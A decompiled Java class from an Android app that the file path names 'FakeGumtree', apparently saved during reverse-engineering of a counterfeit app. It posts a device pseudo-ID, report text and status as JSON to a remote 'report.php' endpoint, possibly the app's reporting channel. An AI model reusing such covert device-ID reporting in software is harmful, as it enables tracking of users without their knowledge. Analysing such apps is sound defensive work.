package com.gumsis.srs.api.requests;

import android.content.Context;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HttpRequest;
import com.gumsis.api.request.HttpResponse;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.api.tls.TxtTls;
import com.gumsis.srs.api.requests.data.ReportData;
import com.gumsis.srs.api.responses.StatusResponse;
import org.json.JSONObject;

public class SendReportRequest
  extends HttpRequest
{
  private static final String PATH = "report.php";
  public static final long UNKNOWN_RID = -1L;
  private HttpResponseHandler<HttpResponse> mResponseHandlerHandler;
  private ReportData reportData;
  
  public SendReportRequest(Context paramContext, int paramInt, ReportData paramReportData)
  {
    this(paramContext, paramInt, paramReportData, null);
  }
  
  public SendReportRequest(Context paramContext, int paramInt, ReportData paramReportData, HttpResponseHandler<HttpResponse> paramHttpResponseHandler)
  {
    super(paramContext, "report.php", paramInt);
    this.reportData = paramReportData;
    try
    {
      this.data = TxtTls.getBytesUTF8(getHttpParams(paramContext));
      this.mResponseHandlerHandler = paramHttpResponseHandler;
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  protected String getHttpParams(Context paramContext)
    throws Exception
  {
    JSONObject localJSONObject1 = new JSONObject();
    JSONObject localJSONObject2 = new JSONObject();
    localJSONObject2.put("id", Realtalk.getPsuedoID(paramContext));
    localJSONObject2.put("report", this.reportData.getReport());
    localJSONObject2.put("status", this.reportData.getStatus());
    if (this.reportData.getRid() != -1L) {
      localJSONObject2.put("rid", this.reportData.getRid());
    }
    localJSONObject1.put("1", localJSONObject2);
    return TxtTls.getPostParamsUTF8(localJSONObject1);
  }
  
  public String getUrl()
  {
    return getBaseUrl();
  }
  
  protected void onRequestFailure(int paramInt, String paramString)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseFailureResponse(paramInt, paramString);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
  
  protected void onRequestSuccess(JSONObject paramJSONObject)
  {
    StatusResponse localStatusResponse = new StatusResponse();
    localStatusResponse.parseSuccessResponse(paramJSONObject);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localStatusResponse);
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/api/requests/SendReportRequest.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */